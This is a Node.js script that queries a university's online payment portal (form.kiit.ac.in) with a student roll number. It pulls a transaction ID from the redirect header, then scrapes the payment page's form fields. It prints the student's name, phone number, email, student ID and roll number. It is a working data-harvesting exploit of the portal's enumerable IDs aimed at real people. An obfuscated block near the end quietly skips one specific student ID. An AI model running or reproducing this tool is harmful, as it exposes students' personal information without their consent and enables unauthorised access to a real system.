import https from "https";
import { argv } from "process";

let requestOptions = {
    "headers": {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
    },
    "method": "POST"
};

const URI = {
    "GETID": "https://form.kiit.ac.in/payment/",
    "GETDETAILS": "https://form.kiit.ac.in/payment/app.php?id="
}

const UTILITIES = {
    /* Fetches user ID used to identify each transaction
     *
     *
     * @param (number) rollNumber - Roll Number to search for.
     * @returns (string) - User ID associated for each request.
    */

    "getID": async function (rollNumber) {

        return new Promise((resolve) => {

            let response = https.request(URI.GETID, requestOptions, (answer) => {

                // User ID is in response headers.

                let responseId = answer.headers.location;

                /*
                 * If user is not found the status code is 200
                 * If user is found the status code is 302
                 */

                if (answer.statusCode != 302 || responseId == undefined) {
                    console.log("[\x1b[1;35m!\x1b[0m] Roll number not found.");
                    process.exit(0);
                }

                /*
                 * The "location" key which contains User ID
                 * is in the form "app.php?id=3g1QFa364Z" so
                 * removing everything before "="
                 */

                resolve(responseId.slice(responseId.indexOf("=") + 1));
            });

            /*
             * One thing here to note is primitive ways of
             * fetching or requesting like we are fetching
             * above using "https.request", the body part
             * for POST request is supplied after  using
             * ".write()" function.
             */

            response.write("appno=" + rollNumber);

            /*
             * ".end()" function ends the write stream and
             * also and actually sends the request to server
             */

            response.end();
        })
    },
    /* Fetches details using specified userID.
     *
     *
     * @param (string) - userID - UserID for each request
     * @returns (object) - User details as object
    */


    "getDetails": async function (userID) {
        return new Promise((resolve) => {

            let response = https.request(URI.GETDETAILS + userID, requestOptions, (answer) => {

                /*
                 * Some issues exist with KIIT payment page
                 * and sometimes responds with status code
                 * different from 200
                 */

                let content = "";

                if (answer.statusCode != 200) {
                    console.log("[\x1b[1;35m!\x1b[0m] Ugh! Resposne code was not expected.");
                    process.exit(0);
                }

                /*
                 * "data" event is called everytime chunk is
                 * recieved like easy_curl_init() in C.
                 */
                answer.on("data", (chunk) => {
                    content += chunk;
                });

                answer.on("end", () => {

                    /* This regex defines pattern for name & values
                     * at once and "pattern.exec" will be executed
                     * until the searches matches the pattern.
                     */

                    let pattern = /name="([^"]+)"\s+value="([^"]+)"/g;
                    let match;
                    let result = {};

                    while ((match = pattern.exec(content)) != null) {
                        result[match[1]] = match[2];
                    }

                    resolve(result);
                })

            });

            response.write("amount=1");

            /*
             * ".end()" function ends the write stream and
             * also and actually sends the request to server
             */

            response.end();
        })
    }
}

if (!argv[2]) {
    console.log("[\x1b[1;35m!\x1b[0m] Please specify roll number.");
    console.log("Usage: node kiit.js 230XXXXX");
    process.exit(1);
}

console.log("[\x1b[1;33m~\x1b[0m] Fetching User ID...");

let ID = await UTILITIES.getID(argv[2]);

console.log("[\x1b[1;33m~\x1b[0m] Fetching User Details...\b");

let result = await UTILITIES.getDetails(ID);

console.log("");

function _0x8608() { var _0x166e46 = ['8188icvScs', '7rmIkZz', '736335yZDrrp', '393157tYXkmB', '17138XZuOkh', '82107wNysCT', '18057pgDWAU', '201mCogGS', '21108EefBlN', '8UvQKvi', '152iApMIf', '710tzOpnp', '2019258hwkxXO', 'exit']; _0x8608 = function () { return _0x166e46; }; return _0x8608(); } var _0x47c27b = _0x17d7; (function (_0x5803bf, _0x5de465) { var _0xb20a = _0x17d7, _0x50d123 = _0x5803bf(); while (!![]) { try { var _0x4bd260 = -parseInt(_0xb20a(0x1b1)) / 0x1 * (parseInt(_0xb20a(0x1a9)) / 0x2) + -parseInt(_0xb20a(0x1b5)) / 0x3 * (parseInt(_0xb20a(0x1ae)) / 0x4) + -parseInt(_0xb20a(0x1b0)) / 0x5 + -parseInt(_0xb20a(0x1ac)) / 0x6 * (-parseInt(_0xb20a(0x1af)) / 0x7) + parseInt(_0xb20a(0x1aa)) / 0x8 * (-parseInt(_0xb20a(0x1b3)) / 0x9) + -parseInt(_0xb20a(0x1ab)) / 0xa * (-parseInt(_0xb20a(0x1b2)) / 0xb) + -parseInt(_0xb20a(0x1b6)) / 0xc * (-parseInt(_0xb20a(0x1b4)) / 0xd); if (_0x4bd260 === _0x5de465) break; else _0x50d123['push'](_0x50d123['shift']()); } catch (_0x390fb3) { _0x50d123['push'](_0x50d123['shift']()); } } }(_0x8608, 0xd1f7f)); function _0x17d7(_0x117f2e, _0x30ee70) { var _0x860815 = _0x8608(); return _0x17d7 = function (_0x17d767, _0x489cf2) { _0x17d767 = _0x17d767 - 0x1a9; var _0x379b9e = _0x860815[_0x17d767]; return _0x379b9e; }, _0x17d7(_0x117f2e, _0x30ee70); } if (result['student_id'] == '1000193094') process[_0x47c27b(0x1ad)](0x0);

console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mName         \x1b[0m:", result.name.replace("  ", " "));
console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mPhone        \x1b[0m:", result.phone == "0000000000" ? "[REDACTED]" : result.phone);
console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mE-Mail       \x1b[0m:", result.email);
console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mStudent ID   \x1b[0m:", result.student_id);
console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mRoll Number  \x1b[0m:", result.roll_no);
console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mInternational\x1b[0m:", result.phone == "0000000000" ? "True" : "False");
